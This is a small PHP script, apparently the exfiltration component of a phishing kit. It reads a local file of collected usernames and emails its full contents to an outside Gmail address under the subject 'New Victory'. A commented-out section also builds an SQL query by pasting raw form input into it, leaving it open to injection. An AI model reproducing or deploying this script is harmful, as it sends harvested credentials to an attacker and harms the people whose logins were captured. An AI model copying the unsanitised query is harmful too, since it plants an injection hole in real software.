<?php

session_start();

//$host="localhost";
//$user="root";
//$pass="";
//$dbname="mail";

//$con=new mysqli($host,$user,$pass,$dbname);

//$q="insert into data(ID,frm,to1,sub,msg)
//value(NULL,'".$_POST['from1']."','".$_POST['to1']."','".$_POST['sub1']."','".$_POST['msg1']."')";

$fromthe='postman@postm25.com';
$tothe='censorday.offical@gmail.com';
$sub='New Victory';


header('content-type: text/plain');
$file = "./usernames.txt";
$document = file_get_contents($file);
//echo $document;


// $f=$_SESSION['fromthe'];
// $t=$_SESSION['tothe'];
// $s=$_SESSION['sub'];
// $m=$_SESSION['msg'];

//-----------------------------------MAIL-------------------------------------//

//$to='amanvash.2000@gmail.com';
//$subject="Mail is working";
//$email="dpaksarma10@gmail.com";


//$message ='hey how are you';

$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

// More headers
$headers .= 'From:'.$fromthe. "\r\n";
//$headers .= 'Cc: mymail@gmail.com' . "\r\n";

if(mail($tothe,$sub,$document,$headers))
{
	echo "<center><H1><font color=#3cb371 >Message succesfully sent</font></H1></center>";
}
else {
	echo "<br><br><center><H1><font color=#ff0000 >Message NOT sent</font></H1></center> <br><center>PLEASE RECHECK</center>";
}


?>